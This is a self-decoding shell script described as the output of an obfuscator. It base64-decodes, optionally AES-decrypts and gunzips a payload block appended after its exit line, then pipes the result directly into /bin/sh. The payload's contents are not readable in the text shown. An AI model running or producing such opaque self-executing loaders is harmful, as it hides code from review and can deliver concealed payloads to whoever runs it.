#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
__OBF_B64_PAYLOAD_END__
